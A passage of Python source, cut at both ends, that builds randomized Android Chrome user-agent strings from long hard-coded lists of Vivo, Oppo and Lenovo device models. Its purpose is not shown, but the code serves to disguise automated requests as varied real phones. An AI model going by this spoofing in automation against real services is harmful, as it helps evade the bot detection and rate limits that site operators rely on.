'Vivo Y1i', 'vivo 2015', 'vivo 2015', 'V2029', 'V2027', 'V2043_21', 'V2101', 'V2070', 'V2054', 'V2052', 'V2037', 'V2032', 'V2038', 'V2038', 'V2129', 'V2129', 'V2111', 'V2149', 'V2140', 'V2140', 'V2152', 'V2152', 'V2110', 'V2110', 'V2131', 'V2135', 'V2207', 'vivo Y22iL', 'vivo Y22iL', 'V2206', 'V2206', 'vivo Y23L', 'vivo Y23L', 'vivo y23l', 'vivo Y23L', 'vivo Y23L', 'vivo Y23L', 'vivo 1613', 'vivo Y27', 'vivo Y27L', 'vivo Y27', 'vivo Y28', 'vivo Y28', 'vivo Y28L', 'vivo Y28L', 'vivo Y29L', 'vivo Y29L', 'vivo Y29L', 'V1901A', 'V1901A', 'V1901A', 'V1901T', 'V1930A', 'vivo 1938', 'V2034A', 'V2036A', 'V2099A', 'V2099A', 'V2160', 'V2160', 'V2160', 'V2066BA', 'V2066A', 'Y30g', 'Vivo Y30S', 'vivo Y31L', 'V2068', 'V2054A', 'V2068A', 'V2068', 'V2158A', 'Vivo Y32', 'V2180A', 'V2057', 'V2109', 'V2166A', 'V2166A', 'V2146', 'V2205', 'V2205', 'vivo Y37A', 'vivo Y37', 'V2044', 'vivo Y3t', 'vivo Y3t', 'vivo Y3t', 'vivo y41', 'vivo Y5 ', 'Vivo Y5', 'vivo 1935', 'VIVO Y50(2021)', 'V2023EA', 'Y50t', 'V2035', 'vivo Y51L', 'vivo Y51A', 'V2030', 'vivo 1707', 'V2031_21', 'vivo Y51t L', 'vivo Y51t L', 'vivo Y51t L', 'V2053', 'V2057A', 'vivo Y53', 'vivo 1606A', 'vivo Y53n', 'V2058', 'V2123A', 'V2069A', 'V2045A', 'V2045A', 'vivo Y55A', 'V2127', 'V2127', 'vivo 1603', 'vivo Y55n', 'vivo 1610', 'V2164A', 'V2164A', 'V1934A', 'V2006', 'vivo Y613', 'vivo Y613', 'vivo Y613F', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y622', 'vivo Y623', 'vivo Y623', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y627', 'vivo Y628', 'vivo Y628', 'vivo 1719', 'vivo Y66', 'vivo Y66L', 'vivo Y66i A', 'vivo Y67', 'vivo Y67A', 'vivo Y67L', 'vivo Y685', 'vivo 1714', 'vivo Y69A', 'V2002A', 'V2002A', 'vivo Y71A', 'vivo 1724', 'vivo Y71A', 'vivo 1801', 'V2041', 'V2060', 'V2102A', 'V1731CA', 'vivo Y73', 'Vivo Y73 /MMB239M', 'V2059', 'V2031A', 'V2164PA', 'V2117', 'vivo Y75A', 'V2142', 'V2142', 'vivo Y75s', 'vivo Y75s', 'vivo Y75S', 'vivo Y75s', 'V2124', 'V2156A', 'V2219A', 'V2219A', 'V2169', 'V2169', 'V1913A', 'vivo 1808i', 'vivo 1803', 'vivo 1803', 'vivo 1812', 'vivo Y81S', 'V1732A', 'V1732T', 'vivo Y83A', 'vivo 1802', 'vivo Y83A', 'vivo Y83A', 'vivo 1726', 'Vivo Y83I', 'vivo Y85A', 'vivo Y85', 'Vivo Y85i', 'Vivo Y86', 'V1730EA', 'vivo v1730ea', 'vivo 1908', 'vivo 1823', 'vivo 1908_19', 'vivo 1817', 'vivo 1811', 'vivo Y913', 'vivo Y913', 'vivo Y91C', 'vivo 1820', 'vivo 1816', 'vivo Y923', 'vivo Y923', 'vivo Y927', 'vivo Y927', 'vivo Y928', 'vivo Y928', 'vivo Y928', 'vivo 1814', 'V1818A', 'V1818A', 'vivo 1814', 'vivo Y937', 'vivo Y937', 'vivo Y937', 'V1818CT', 'V1818CA', 'vivo 1807', 'vivo Y95', 'V1813A', 'V1813T', 'V1813A', 'vivo Y97', 'V1945A', 'V1801A0', 'vivo Z1', 'vivo 1918', 'vivo 1951', 'vivo 1951', 'VIVO Z1Pro', 'vivo 1918', 'vivo 1918 Flow', 'Vivo Z10', 'vivo Z1i', 'V1730DA', 'V1730DT', 'vivo Z1i', 'vivo_1951', 'vivo 1917', 'V1813BA', 'V1813BT', 'V1813BT', 'Vivo Z34', 'vivo Z3x', 'V1730GA', 'vivo Z3x', 'vivo Z3x', 'V1921A', 'V1911A', 'V1911A', 'V1911A', 'V1990A', 'V1990A', 'V1963A', 'V1963A'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Oppo':
                    self.android_version = random.choice(['13', '12', '11', '9', '10'])
                    self.android_model = random.choice(['OPPO 1105', 'oppo 15', 'Oppo 3T', 'Oppo 62A', 'oppo6779', 'oppo6833', 'OPPO7273', 'Oppo 9A', 'Oppo A1', 'PHQ110', 'PHQ110', 'PCHM10', 'PCHM10', 'PCHM10', 'PCHM10', 'CPH2071', 'PCHT30', 'PCHM00', 'CPH2083', 'CPH2083', 'CPH2083', 'CPH2185', 'CPH2179', 'CPH2269', 'CPH2421', 'CPH2349', 'CPH2271', 'CPH2477', 'CPH2471', 'CPH2471', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1923', 'CPH1925', 'oppo A25', 'CPH1837', 'PADT00', 'PADM00', 'CPH1837', 'PADM00', 'OPPO A30', 'OPPO A30', 'OPPO A30', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'CPH2015', 'OB-OPPO A31c', 'PDVM00', 'PDVM00', 'PDVM00', 'PDVM00', 'CPH2137', 'OPPO A33', 'OPPO A33m', 'OPPO A33t', 'OPPO A34', 'Oppo A34', 'PEFM00', 'PEFM00', 'PEFM00', 'PEFM00', 'PESM10', 'PESM10', 'PESM10', 'PESM10', 'OPPO A36', 'OPPO A37m', 'OPPO A37f', 'A37fw', 'OPPO A37t', 'OPPO A37t', 'OPPO A38', 'CPH1605', 'CPH1605', 'CPH1803', 'OPPO CPH1803', 'OPPO CPH1803', 'OPPO PBBM30', 'CPH1803', 'CPH1853', 'Oppo A4', 'OPPO A40', 'Oppo A400', 'OPPO A41', 'OPPO A42', 'OPPO A43', 'Oppo A43', 'OPPO A44', 'OPPO A45', 'Oppo A45', 'OPPO A46', 'OPPO A47', 'OPPO A48', 'OPPO A49', 'OPPO PBBT30', 'PBAM00', 'CPH1809', 'OPPO PBAT00', 'OPPO PBAM00', 'PBAM00', 'CPH1809', 'CPH1809', 'OPPO PBAM00', 'PBAT00', 'CPH1931', 'CPH1933', 'OPPO A50', 'OPPO A51', 'oppo A51', 'CPH2069', 'CPH2061', 'CPH2061', 'CPH2127', 'CPH2139', 'PECM20', 'PECT30', 'PECM30', 'PECM30', 'OPPO A53m', 'OPPO A53m', 'OPPO A53m', 'CPH2135', 'CPH2321', 'CPH2239', 'CPH2239', 'CPH2195', 'OPG02', 'CPH2273', 'CPH2325', 'PEMT20', 'PEMM20', 'PEMT00', 'PEMM00', 'PEMM00', 'PEMM20', 'PEMM00', 'PEMM20', 'A102OP', 'CPH2309', 'OPPO A56', 'PFVM10', 'PFVM10', 'CPH2407', 'OPPO A57', 'CPH1701', 'OPPO A57', 'CPH1701', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'OPPO A57t', 'CPH2387', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'PHJ110', 'OPPO A59', 'OPPO A59m', 'OPPO A59m', 'OPPO A59s', 'OPPO A59S', 'OPPO A59s', 'OPPO A59st', 'OPPO A59t', 'CPH1909', 'CPH1901', 'OPPO PBFT00', 'OPPO PBFM00', 'CPH1717', 'CPH1801', 'CPH1801', 'Oppo A71A', 'CPH2067', 'PDYM20', 'PDYM10', 'PDYT10', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'OPPO A73', 'CPH2161', 'CPH2099', 'OPPO A73t', 'OPPO A73t', 'OPPO A73t', 'CPH2219', 'OPPO CPH2219', 'CPH2197', 'CPH2263', 'CPH2375', 'CPH1715', 'OPPO A77', 'CPH2339', 'CPH2385', 'CPH2473', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'OPPO A77t', 'CPH2483', 'OPPO A79', 'OPPO A79', 'OPPO A79kt', 'OPPO A79', 'OPPO A79k', 'OPPO A79k', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'OPPO A79t', 'PCDM00', 'OPPO PCDM00', 'PCDM00', 'PCDM00', 'PCDT00', 'PBBM00', 'PBBM00', 'PBBM00', 'PBBT00', 'PDBM00', 'PDBM00', 'PDBM00', 'PDBM00', 'OPPO A83', 'CPH1729', 'OPPO A83', 'CPH1827', 'CPH1827', 'OPPO A83t', 'OPPO A83t', 'OPPO A83t', 'PCAM10', 'PCAM10', 'PCAM10', 'CPH1938', 'PCAT10', 'PCAM10', 'CPH1938', 'CPH1937', 'CPH1941', 'CPH2001', 'CPH2021', 'PCPM00', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2001', 'CPH2059', 'PDKT00', 'PDKM00', 'PDKT00', 'PDKT00', 'PDKM00', 'CPH2121', 'PEHM00', 'CPH2123', 'PFGM00', 'PFGM00', 'PFGM00', 'CPH2203', 'CPH2333', 'CPH2365', 'PHA120', 'PHA120', 'OPPO A96', 'PFUM10', 'PFUM10', 'PFUM10', 'PFTM10', 'PFTM10', 'Oppo A98', 'PCEM00', 'PCEM00', 'PCET00', 'CPH1851', 'CPH1920', 'CPH1903', 'A1603', 'OPPOCNM632', 'CPH1114', 'CPH1235', 'CPH1451', 'CPH1615', 'CPH1664', 'CPH1869', 'CPH1869', 'CPH1929', 'CPH1985', 'CPH2048', 'CPH2048', 'CPH2048', 'CPH2107', 'CPH2238', 'CPH2332', 'CPH2351', 'CPH2389', 'CPH2419', 'CPH2451', 'CPH2465', 'CPH2467', 'CPH2529', 'CPH2531', 'CPH2531', 'CPH2589', 'CPH2643', 'CPH3475', 'CPH3669', 'CPH3682', 'CPH3731', 'CPH3776', 'CPH3785', 'CPH4125', 'CPH4275', 'CPH4299', 'CPH4395', 'CPH4473', 'CPH4987', 'CPH5286', 'CPH5841', 'CPH5947', 'CPH6178', 'CPH6244', 'CPH6271', 'CPH6316', 'CPH6519', 'CPH6528', 'CPH6697', 'CPH7338', 'CPH7364', 'CPH7382', 'CPH7532', 'CPH7577', 'CPH7991', 'CPH8153', 'CPH8346', 'CPH8347', 'CPH8363', 'CPH8393', 'CPH8467', 'CPH8472', 'CPH8534', 'CPH8686', 'CPH8893', 'CPH9177', 'CPH9226', 'CPH9659', 'CPH9667', 'CPH9716', 'CPH9763', 'CPH9929', 'oppo f 5 plus', 'OPPO F1 Plus', 'Oppo F1', 'Oppo F1', 'X9009', 'OPPO R9m', 'X9009', 'Oppo F10', 'CPH1911', 'CPH1969', 'Oppo F11Pro', 'CPH2095', 'CPH2119', 'OPPO F19', 'Oppo F19', 'CPH2285', 'CPH2285', 'CPH2213', 'CPH2213', 'CPH2223', 'A1601', 'OPPO F1s', 'OPPO F1s', 'A1601', 'CPH2341', 'CPH2461', 'CPH2455', 'CPH2461', 'CPH2455', 'CPH2527', 'CPH1609', 'CPH1609', 'CPH1609', 'CPH1613', 'CPH1727', 'CPH1723', 'CPH1727', 'CPH1723', 'CPH1723', 'CPH1725', 'CPH1725', 'Oppo F51', 'Oppo F61 Pro', 'CPH1819', 'CPH1821', 'CPH1819 Flow', 'CPH1881', 'CPH1825', 'CPH1825', 'CPH1881', 'CPH1881', 'CPH1825', 'CPH1881', 'CPH1823', 'X909', 'X909', 'R827T', 'R827T', 'R827', 'X9076', 'X9077', 'X9070', 'X9077', 'X9076', 'X9077', 'X9006', 'X9007', 'X9000', 'X9007', 'X9006', 'X9006', 'R815W', 'R815T', 'R815', 'R8111', 'OPPOR8111', 'R821T', 'R821', 'R821', 'PEUM00', 'PEUM00', 'PEUM00', 'PEUM00', 'PGU110', 'PGU110', 'CPH2437', 'PGT110', 'U707T', 'PAFM00', 'CPH1875', 'PAFT00', 'CPH1871', 'PAHM00', 'PAHM00', 'PAHM00', 'PAHM00', 'CPH2023', 'PDEM10', 'CPH2005', 'CPH2025', 'Find X2 Pro', 'PDEM30', 'PEDM00', 'PEDM00', 'Find X3 Neo', 'CPH2173', 'OPG03', 'PEEM00', 'CPH2307', 'PFFM10', 'CPH2305', 'PFEM10', 'OPPOJLAJH6', 'R1011', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCM30', 'PBCT10', 'CPH2373', 'PGJM10', 'CPH2337', 'PGIM10', 'PGGM10', 'PGGM10', 'CPH1955', 'PCNM00', 'PCNM00', 'PCNM00', 'PCLM50', 'PCLM50', 'PCLM50', 'PERM00', 'PERM00', 'PERM00', 'PEXM00', 'PEXM00', 'PEXM00', 'PEYM00', 'PEYM00', 'PEYM00', 'PERM10', 'PERM10', 'PGCM10', 'PGCM10', 'PGCM10', 'N5117', 'N5117', 'N5117', 'N1T', 'N1T', 'N5209', 'N5207', 'N5207', 'R831T', 'R831T', 'R831', 'Oppo Neo 7', 'R831K', 'R831K', 'R831K', '1201', 'A33w', 'A33f', 'A33fw', 'OPD2102A', 'OPD2101', 'OPPO R10', 'R1001', 'OPPO R11', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11t', 'OPPO R11', 'OPPO R11 Plusk', 'OPPO R11 Plus', 'OPPO R11 Plus', 'OPPO R11 Pluskt', 'OPPO R11plus', 'OPPO R11s', 'OPPO R11s', 'OPPO R11st', 'OPPO R11s', 'CPH1719', 'OPPO R11st', 'OPPO R11s', 'OPPO R11s', 'CPH1721', 'OPPO R11s Plus', 'OPPO R11s Plust', 'PAAM00', 'PACM00', 'PACM00', 'PACT00', 'CPH1835', 'PAAM00', 'CPH1831', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBCM10', 'PBEM00', 'CPH1879', 'PBET00', 'PBEM00', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1893', 'CPH1877', 'PBDM00', 'PBDT00', 'R8001', 'R8006', 'R8006', 'R8007', 'R8000', 'R8007', 'R8007', 'R8200', 'R8201', 'R8200', 'R8206', 'R2001', 'R2010', 'R2017', 'R2017', 'R8107', 'R8109', 'R8106', 'R8107', 'Oppo R53', 'R6007', 'R7g', 'OPPO R7', 'R7f', 'OPPO R7', 'OPPO R7', 'R7kf', 'R7Plus', 'R7Plusm', 'R7Plus', 'R7Plust', 'R7Plusm', 'R7Plust', 'R7Plusm', 'R7plusf', 'R7005', 'R7007', 'R7007', 'R7sf', 'OPPO R7s', 'OPPO R7sPlus', 'OPPO R7sPlus', 'OPPO R7sm', 'OPPO R7sm', 'oppo r7sm', 'OPPO R7sm', 'OPPO R7sm', 'OPPO R7st', 'OPPO R7t', 'OPPO R7t', 'R801', 'R805', 'OPPOR805', 'R811', 'R819', 'R819T', 'R819T', 'R819T', 'R8205', 'R8207', 'R8207', 'R8207', 'R823T', 'R829', 'R829T', 'R830', 'R830S', 'R833T', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plusm A', 'OPPO R9 Plustm A', 'X9079', 'OPPO R9km', 'OPPO R9km', 'OPPO R9km', 'OPPO R9sk', 'OPPO R9sk', 'CPH1607', 'OPPO R9st', 'CPH1611', 'OPPO R9s Plus', 'OPPO R9t', 'OPPO R9t', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'OPPO R9tm', 'CPH1917', 'PCAM00', 'PCAM00', 'PCAM00', 'PCAT00', 'PCCT00', 'PCCT00', 'CPH1919', 'PCCM00', 'CPH1907', 'CPH1907', 'CPH1907', 'CPH1907', 'PCKM00', 'CPH1907', 'CPH1989', 'CPH1989', 'CPH1951', 'CPH1945', 'CPH1945', 'CPH2043', 'CPH2043', 'PDCM00', 'A001OP', 'PDCM00', 'PDCM00', 'PCRT01', 'PCRT01', 'CPH2009', 'CPH2035', 'CPH2037', 'CPH2013', 'A002OP', 'CPH2113', 'CPH2091', 'PDPM00', 'PDPT00', 'CPH2125', 'CPH2109', 'CPH2109', 'PDNM00', 'CPH2089', 'PDNM00', 'PDNT00', 'PEAT00', 'PEAM00', 'PEAM00', 'CPH2209', 'CPH2065', 'CPH2159', 'CPH2159', 'CPH2145', 'PEGM00', 'CPH2205', 'CPH2207', 'PDSM00', 'CPH2201', 'PDST00', 'PDSM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'PDRM00', 'CPH2199', 'A101OP', 'A103OP', 'CPH2217', 'CPH1921', 'PEGM10', 'PEGT10', 'PEGT10', 'PEGM10', 'PEGT10', 'CPH2211', 'CPH2235', 'CPH2251', 'PEQM00', 'PEPM00', 'PEPM00', 'CPH2247', 'CPH2249', 'PENM00', 'PENM00', 'PENM00', 'PENM00', 'CPH2237', 'CPH2237', 'CPH2371', 'CPH2363', 'CPH2293', 'PFDM00', 'PFCM00', 'PFCM00', 'PFCM00', 'A201OP', 'CPH2353', 'OPG04', 'CPH2343', 'PGBM10', 'PGBM10', 'PGBM10', 'CPH2357', 'CPH2359', 'PFZM10', 'CPH2457', 'CPH2481', 'CPH2505', 'PHM110', 'PHM110', 'PHM110', 'PHM110', 'PGX110', 'PGX110', 'PGX110', 'PGW110', 'PGW110', 'PGW110', 'CPH1983', 'CPH1983', 'PCLM10', 'PCLM10', 'PCLM10', 'PCLM10', 'PDHM00', 'arm_64 PDHM00', 'PDHM00', 'PCGM00', 'PCGM00', 'PCGM00', 'PCGM00', 'CPH1979', 'PCDM10', 'CPH1979', 'Oppo Reno2 /MMB29M', 'OPPO Reno5 Pro Plus', 'Oppo S1', 'Oppo S17', 'Oppo S4', 'OPPOT29', 'U705T', 'U705T', 'Oppo V5', 'OW20W1', 'OW19W2', 'OW19W3', 'OW19W1', 'oppo x', 'Oppo X', 'OPPO x20 70816.012', 'OPPO x22 6.012', 'OPPOX9017', 'OPPOX907', 'OPPOX907', 'Oppo Y15', 'Oppo Y21', 'Oppo Y3', 'Oppo Z1'])
                    self.useragent = ('Mozilla/5.0 (Linux; Android {}; {}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Mobile Safari/537.36'.format(self.android_version, self.android_model, self.browser_version))
                elif self.jenis == 'Lenovo':
                    self.android_version = random.choice(['11', '12', '9'])
                    self.android_model = random.choice(['lenovo1023', 'Lenovo 1023', 'Lenovo 3056', 'Lenovo 3300A', 'Lenovo 76S', 'Lenovo 8389', 'Lenovo A 319', 'Lenovo A1010a20', 'Lenovo A1000', 'IdeaTabA1000L-F', 'Lenovo A1000', 'Lenovo-A101', 'Lenovo A1900', 'Lenovo A2010l36', 'Lenovo_a2010', 'Lenovo A2010l36/S100', 'Lenovo A2016b31', 'A2107A-H', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'Lenovo A2107', 'IdeaTab A2107A-H', 'IdeaTab A2107A-H', 'Lenovo A2580', 'Lenovo-A269i/S001', 'id Lenovo_A269i', 'Lenovo A2860', 'Lenovo A288t', 'Lenovo L18021', 'Lenovo L18021', 'Lenovo L18021', 'Lenovo A308t', 'Lenovo A316', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo A316i', 'Lenovo_A318t', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A319', 'Lenovo A320t', 'Lenovo A328', 'Lenovo A328t', 'Lenovo A328', 'Lenovo A330e', 'Lenovo A330e', 'Lenovo A338T', 'Lenovo A338t', 'Lenovo A355e', 'Lenovo A358t', 'Lenovo A360t', 'Lenovo A360t', 'Lenovo A360t', 'Lenovo A368t', 'Lenovo A3690', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'Lenovo A369i', 'id Lenovo_A369i', 'Lenovo A378t', 'Lenovo A378t', 'Lenovo A3860', 'Lenovo A388t', 'Lenovo A3900', 'Lenovo A3910t30', 'Lenovo A396', 'Lenovo A398t', 'Lenovo A399', 'Lenovo A399', 'Lenovo A399', 'Lenovo A4526', 'L18011', 'Lenovo L18011', 'Lenovo A5000', 'Lenovo A5000', 'Lenovo A5000', 'Lenovo A516', 'Lenovo A516', 'Lenovo A516', 'Lenovo-A516/S111', 'Lenovo A516', 'Lenovo A520/S101', 'Lenovo A526', 'LENOVO A526', 'Lenovo A526', 'LENOVO A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A526', 'Lenovo A529', 'Lenovo A529', 'Lenovo A536', 'Lenovo A536', 'Lenovo A536', 'Lenovo A560', 'Lenovo A560', 'Lenovo A560/JLS36C', 'Lenovo A5600', 'Lenovo A5600', 'LNV-Lenovo_A560e', 'Lenovo A5860', 'LenovoA588t', 'Lenovo A590', 'Lenovo L18081', 'Lenovo L19041', 'Lenovo A6000', 'Lenovo A6000', 'Lenovo A6000 Plus', 'Lenovo A6010', 'Lenovo A6010', 'Lenovo A6010Pro', 'Lenovo A606', 'Lenovo A606', 'Lenovo A616', 'Lenovo A630', 'Lenovo A630/S001', 'Lenovo A630t', 'Lenovo A630t', 'Lenovo A656', 'Lenovo A66/S001', 'Lenovo A660', 'Lenovo A660', 'Lenovo A660', 'Lenovo A6600', 'Lenovo A6600d40', 'Lenovo A6600a40', 'Lenovo A670t', 'Lenovo A680', 'Lenovo A680', 'Lenovo A680_ROW', 'Lenovo A6800', 'Lenovo A688t', 'Lenovo A690', 'Lenovo A690/S001', 'Lenovo L19111', 'Lenovo A7000 Plus', 'Lenovo A7000a', 'Lenovo A706', 'LENOVO A706', 'Lenovo_A706/JZO54K', 'Lenovo A708t', 'Lenovo A750', 'Lenovo A750', 'Lenovo A760', 'Lenovo A760', 'Lenovo_A766/JOP40D', 'Lenovo A768t', 'Lenovo A7700', 'Lenovo A788t', 'Lenovo A788t', 'Lenovo A789', 'lenovo A789', 'LENOVO A789', 'Lenovo L10041', 'Lenovo A800', 'Lenovo A800', 'Lenovo A805e', 'Lenovo A808', 'Lenovo A808t', 'Lenovo A808t', 'Lenovo A808t', 'Lenovo A816', 'Lenovo A816', 'Lenovo A820', 'Lenovo A820', 'Lenovo A820', 'Lenovo_A820', 'lenovoA820c', 'Lenovo A820e', 'Lenovo A820t', 'Lenovo A828t', 'Lenovo A828t', 'Lenovo A830', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'Lenovo A850', 'lenovoA850c', 'Lenovo A850i', 'Lenovo A858t', 'LENOVO A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A859', 'Lenovo A880', 'Lenovo A880', 'Lenovo A880', 'Lenovo A880', 'Lenovo A889', 'Lenovo A889', 'Lenovo A889', 'Lenovo A916', 'Lenovo A916', 'Lenovo_A916', 'Lenovo A916', 'Lenovo A938t', 'Lenovo A2016b30', 'Lenovo K10a40', 'Lenovo D101', 'Lenovo-D101', 'd-42A', 'Lenovo TB-X104F', 'Lenovo TB-X104L', 'Lenovo G756', 'Lenovo A806', 'Lenovo A936', 'Lenovo A936', 'Lenovo_A936', 'Lenovo H75676', 'Lenovo I5', 'Lenovo-I960', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'IdeaPadA10', 'Ideapad K1', 'Ideapad K1', 'IdeaTabA1000-F', 'IdeaTabA1000-G', 'IdeaTabA1000-T', 'IdeaTabA1000-F', 'IdeaTabA1000-T', 'IdeaTabA1000-T', 'IdeaTabA1000-F', 'IdeaTabA1000-F', 'IdeaTabA1000-G', 'IdeaTabA1000-F', 'IdeaTab A2107A-F', 'IdeaTab A2107A-F', 'IdeaTabA2109A', 'IdeaTabA2109A', 'A2109A', 'IdeaTabA2109A', 'IdeaTabA2207A-H', 'IdeaTab A3000-H', 'IdeaTab A3000-H', 'Lenovo A3000-H', 'Lenovo A3000-H', 'IdeaTabA5000-E', 'IdeaTab_A5000-E', 'Lenovo B8080-H', 'IdeaTabS2109A-F', 'IdeaTabS2109A-F', 'IdeaTabS2109A-F', 'IdeaTabS2110AH', 'Lenovo S5000-F', 'Lenovo S5000-H', 'Lenovo S5000-H/JDQ39', 'Lenovo S6000-H', 'IdeaTab S6000-H', 'IdeaTab S6000-F', 'ar_AE Lenovo K10', 'Lenovo K10 Note', 'Lenovo L39051', 'Lenovo K10e70', 'Lenovo K10e70', 'Lenovo L38083', 'Lenovo L38082', 'Lenovo K11', 'Lenovo K11 Power', 'Lenovo K12', 'Lenovo XT2081-4', 'Lenovo K12 Note', 'Lenovo K12 Pro', 'Lenovo K13', 'Lenovo K13 Note', 'Lenovo K13 Pro', 'Lenovo K14', 'Lenovo K14 Note', 'Lenovo K14 Plus', 'Lenovo K15 Plus', 'Lenovo K30-W', 'Lenovo K50a40', 'Lenovo K50-t5', 'Lenovo K50-T5', 'K31-t3', 'Lenovo K31-t3', 'Lenovo K320t', 'arm Lenovo K320t', 'Lenovo K32c30', 'Lenovo K32c36', 'Lenovo K32c36', 'Lenovo K33', 'Lenovo K33b37', 'MZ-Lenovo K3note', 'Lenovo K4', 'Lenovo A7010a48', 'K350t', 'Lenovo A7020a48', 'Lenovo A7020a40', 'Lenovo K52e78', 'Lenovo L38012', 'Lenovo L38011', 'en Lenovo L38011', 'Lenovo L38011', 'Lenovo L38041', 'Lenovo K5 Pro', 'Lenovo_K50_T5', 'Lenovo K52t38', 'Lenovo K52t58', 'Lenovo K53', 'Lenovo K53b36', 'Lenovo L38031', 'Lenovo K33b36', 'Lenovo K33a48', 'Lenovo K53a48', 'Lenovo K33a42', 'Lenovo_K33a42', 'lenovoK7', 'Lenovo K8', 'Lenovo K8 Note', 'Lenovo K8 Plus', 'Lenovo K8 Plus', 'Lenovo K80M', 'Lenovo K80M', 'Lenovo_K80M', 'Lenovo K860', 'Lenovo L38043', 'Lenovo L38043', 'Lenovo K900', 'Lenovo K900', 'Lenovo_K900_ROW', 'Lenovo K910', 'Lenovo K910', 'Lenovo K910e', 'Lenovo L79041', 'Lenovo L70081', 'Lenovo L79031', 'Lenovo L79031', 'Lenovo L71091', 'Lenovo L71091', 'Lenovo L71091', 'Lenovo TB-9707F', 'Lenovo L71061', 'VR-1541F', 'TB-X704A', 'Lenovo TB-X704A', 'Lenovo N300', 'Lenovo N300', 'Lenovo N308', 'Lenovo Note 5', 'lenovo P01k000', 'Lenovo_P1m', 'Lenovo P1m', 'Lenovo P2a42', 'Lenovo P2a42', 'Lenovo P2c72', 'Lenovo P2c72', 'Lenovo P70', 'Lenovo P70', 'Lenovo p70', 'Lenovo P700', 'Lenovo P700i', 'Lenovo P770', 'Lenovo P770', 'Lenovo P770', 'Lenovo P770', 'Lenovo P780', 'Lenovo P780', 'Lenovo P780', 'Lenovo P90', 'Lenovo P90', 'Lenovo-P960', 'Lenovo PB1-750M', 'Lenovo PB2-650M', 'Lenovo PB2-670M', 'Lenovo PB1-770M', 'Lenovo S1c58', 'Lenovo S1L a40', 'Lenovo K520', 'Lenovo K520', 'Lenovo L58041', 'Lenovo L58091', 'Lenovo S580', 'Lenovo S580', 'Lenovo S60-a', 'Lenovo S60-a', 'Lenovo S60A', 'Lenovo S650', 'Lenovo S650', 'Lenovo S650', 'Lenovo S658t', 'Lenovo S660', 'LenovoS668T', 'Lenovo S668T', 'Lenovo S668t', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720', 'Lenovo S720i', 'Lenovo S720i', 'Lenovo S750', 'lenovo s750', 'Lenovo S750', 'Lenovo S810t', 'Lenovo S820', 'Lenovo S820', 'Lenovo S820', 'lenovo S820c', 'Lenovo S820e', 'Lenovo S850', 'Lenovo S850t', 'Lenovo S856', 'Lenovo S858t', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860', 'Lenovo S860/JDQ39', 'LNV-Lenovo S870e', 'Lenovo S880', 'Lenovo S880', 'Lenovo S890', 'Lenovo S890', 'Lenovo S890', 'Lenovo S890', 'Lenovo-S890/S100', 'Lenovo S898t', 'Lenovo S898t /V1.5', 'Lenovo s898t', 'Lenovo S90A', 'LenovoS90C', 'Lenovo S920', 'Lenovo S920', 'Lenovo S920/V1.5', 'Lenovo S930', 'Lenovo S938t', 'Lenovo S939', 'Lenovo S939', 'Lenovo S960', 'Lenovo S960', 'Lenovo TB-8505FS', 'Lenovo TB-8505XS', 'Lenovo TAB 2 A10-70L', 'Lenovo TAB 2 A7-30HC', 'Lenovo TAB 2 A7-30DC', 'Lenovo TAB 2 A7-30GC', 'Lenovo TB-8504F', 'Lenovo TB-8704F', 'A101LV', 'Lenovo TB-7504X', 'Lenovo TB-7504X', 'Lenovo TB-7304X', 'Lenovo TB-7304I', 'Lenovo TB-7304F', 'Lenovo TB-7104F', 'Lenovo TB-7104I', 'Lenovo TB-8304F1', 'Lenovo TB-8304F1', 'Lenovo TB-X6C6F', 'Lenovo TB-X6C6X', 'Lenovo TB-J606N', 'Lenovo TB-J607Z', 'Lenovo TB-X505F', 'Lenovo TB-X505X', 'Lenovo TB-X505L', 'Lenovo TB-X605F', 'TB328FU', 'TB328XU', 'Lenovo TB-X605L', 'Lenovo TB-X605M', 'Lenovo TB-X606XA', 'Lenovo TB-X606F', 'Lenovo TB-X605LC', 'Lenovo TB-X605FC', 'Lenovo TB-X306FA', 'Lenovo TB-X306X', 'Lenovo TB125FU', 'Lenovo TB128XU', 'TB128FU', 'Lenovo TB-7305X', 'Lenovo TB-7305X', 'Lenovo TB-7305F', 'Lenovo TB-7305I', 'Lenovo TB-7306F', 'Lenovo TB-7306X', 'Lenovo TB-8506F', 